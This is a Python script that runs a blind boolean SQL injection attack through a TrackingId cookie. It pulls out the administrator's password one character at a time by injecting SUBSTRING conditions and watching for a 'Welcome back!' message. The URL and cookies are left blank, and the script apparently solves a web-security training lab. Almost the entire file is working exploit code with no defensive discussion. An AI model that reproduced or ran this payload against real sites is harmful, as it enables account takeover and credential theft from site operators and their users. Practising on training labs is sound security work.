import requests
import string
import time


url = ""
cookies = {
    'TrackingId': '',
    'session': ''
}


headers = {
    'User-Agent': '',
    'Accept': '',
    'Accept-Language': '',
    'Accept-Encoding': '',
    'Referer': '',
    'Upgrade-Insecure-Requests': '',
    'Sec-Fetch-Dest': '',
    'Sec-Fetch-Mode': '',
    'Sec-Fetch-Site': '',
    'Sec-Fetch-User': '',
    'Te': ''
}

chars = string.ascii_letters + string.digits + string.punctuation  
def test_sql_injection():
    password = ""  
    max_length = 20  
    
    for i in range(1, max_length + 1):
        found_char = None  
        print(f"Testing position {i}...")
        
        for char in chars:
            payload = f"' AND SUBSTRING((SELECT password FROM users WHERE username='administrator'),{i},1)='{char}' -- "
            
            modified_cookies = cookies.copy()
            modified_cookies['TrackingId'] += payload  
            
            response = requests.get(url, cookies=modified_cookies, headers=headers)
            
            print(f"Testing character '{char}' at position {i}: Status code {response.status_code}")
            
            if "Welcome back!" in response.text or "Logged in" in response.text:  
                password += char  
                print(f"Found character: '{char}' at position {i}")
                found_char = char  
                break  
        
        if not found_char:
            print(f"No character found at position {i}. Moving to the next position.")
        
       
        time.sleep(1)

    print(f"Administrator's password: {password}")

test_sql_injection()
